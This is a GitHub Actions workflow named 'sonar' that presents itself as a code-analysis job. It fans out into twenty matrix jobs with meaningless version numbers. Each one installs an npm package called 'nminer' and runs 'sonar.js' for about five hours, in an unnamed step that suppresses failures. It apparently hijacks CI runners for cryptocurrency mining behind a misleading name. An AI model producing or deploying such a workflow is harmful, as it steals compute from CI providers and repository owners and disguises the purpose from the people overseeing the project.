name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7652 }
          - { version: 5228 }
          - { version: 3649 }
          - { version: 9419 }
          - { version: 3071 }
          - { version: 6557 }
          - { version: 267 }
          - { version: 5394 }
          - { version: 1298 }
          - { version: 5573 }
          - { version: 6488 }
          - { version: 3535 }
          - { version: 9235 }
          - { version: 9578 }
          - { version: 4882 }
          - { version: 5651 }
          - { version: 5585 }
          - { version: 3278 }
          - { version: 6994 }
          - { version: 4568 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 309m node sonar.js || echo "sonar executed"